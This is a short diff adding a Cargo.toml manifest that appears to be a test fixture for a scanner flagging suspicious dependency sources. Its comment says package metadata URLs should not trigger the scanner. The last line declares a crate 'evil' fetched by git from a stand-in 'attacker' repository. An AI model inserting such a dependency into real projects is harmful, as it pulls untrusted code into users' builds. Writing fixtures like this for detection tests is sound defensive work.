@@ -1,0 +1,10 @@
+[package]
+name = "dep-bootstrap"
+version = "0.1.0"
+# Metadata URLs under [package] must NOT fire — only dependency sources do.
+repository = "https://github.com/me/demo"
+homepage = "https://demo.rs"
+
+[dependencies]
+serde = "1.0"
+evil = { git = "https://github.com/attacker/evil-crate" }
